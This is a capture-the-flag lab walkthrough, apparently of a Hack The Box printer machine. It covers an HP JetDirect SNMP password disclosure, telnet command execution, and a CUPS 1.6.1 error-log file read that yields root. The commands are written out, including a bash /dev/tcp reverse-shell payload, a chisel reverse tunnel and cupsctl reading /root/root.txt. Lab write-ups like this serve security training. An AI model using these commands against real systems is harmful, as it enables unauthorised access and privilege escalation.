1. Run nmap to discover open ports and services from the web server.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/72d9eac3-875f-4d28-a456-57a2e32964c8)

2. From the result, it shows telnet service so I try to telnet the ip address and been asked to input a password.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/dc894ff0-033e-4f32-a91d-52ab67f7d696)

3. Let's check from the udp port with nmap.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/746ff511-077e-4cbe-be97-4c25105ca817)

4. I discover that a SNMP port 161 is opened. Next, I googling all the way to find any vulnerability related to snmp and HP JetDirect and found this [link](https://www.exploit-db.com/exploits/22319) where's about HP JetDirect password disclosure. I can execute `snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0`
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/7896ce2a-bf3b-47e4-a7cc-0922bede6aa0)

5. Seems like an ascii sequence. To decode I can use this [tool](https://www.dcode.fr/ascii-code) and the password is P@ssw0rd@123!!123
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/8b3f6da9-ef59-4f60-9505-96e251084c2e)

6. Input the password and I try to input `ls` directly first and it isn't working so I try add exec in front of the input. The flag is found in user.txt.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1dc5128e-7c17-4794-a22a-a63b677e0914)

7. Another vulnerability is I can do reverse shell with this payload `exec bash -c "bash -i >& /dev/tcp/10.10.14.13/777 0>&1"`. 
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/8663694e-0aa4-480e-9e5d-1df1e48d086e)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/4483c745-329f-4450-ba1c-8563d9c0502e)

8. Checking one by one directory and not find any interesting thing. Let's check the network stats.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1efa4b48-0667-4cce-943e-0f13bc13e07e)

9. The second one is quite suspicious because it runs locally. I can't check directly because it runs on target machine, not our machine. Don't worry, I can use tool called [Chisel](https://github.com/jpillora/chisel) to give access so I can access the target machine localhost in our terminal. I can run `python3 -m http.server 80` in our machine and `wget <ip address>/<chiselfile>` for give the chisel file to target machine.<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/b95cd0bb-2d88-47fd-837c-48c2785d6595)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/0b89b912-658b-4465-bea6-11ec0a4de0eb)

10. Now I do a small reverse shell with chisel. I can run this payload and here's the response. When I opened, it's a CUPS 1.6.1 web server.
Target Terminal:
`./chisel_1.9.1_linux_amd64 client 10.10.14.13:888 R:631:localhost:631`

Host Terminal:
`./chisel_1.9.1_linux_amd64 server -p 888 --reverse`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/c1e501c3-5b8b-4c2b-9cce-7f090c8a30b2)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/9a8a6ef1-1790-4cdb-91fa-918d7372cf75)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/606ea037-8368-4529-be17-ffd80ec31662)

11. Open administration page (admin) and I get these features.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1d643aa7-6d53-48c8-a1af-eac38c318f34)

12. Googling to find any vulnerability related to CUPS 1.6.1 and found this [article](https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/). It describes that the cupsd daemon change any input inside the error log as a plaintext.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6a7fd4fc-3926-4f07-96c9-466791558123)

13. Because it's related to error log, next I open the `view error log` feature in administration page and it looks like this.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/7120d6bf-7363-4dbd-9a3a-d3bec38af0f2)

14. Now I are searching the payload that are related to CUPS 1.6.1 and error log. Then I find this [payload](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/79e12161-9fc5-48a5-9e90-f4d0e78da5ae)

15. Now I just need to run `cupsctl ErrorLog="/root/root.txt"`. This means that the cupsctl give the input to ErrorLog so the cupsd daemon can translate it into plaintext as a bash command. To see the response, I can run `curl 127.0.0.1:631/admin/log/error_log?` and get the root flag!<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/fe90d7d5-38a1-4140-8ae7-303880c4e91f)





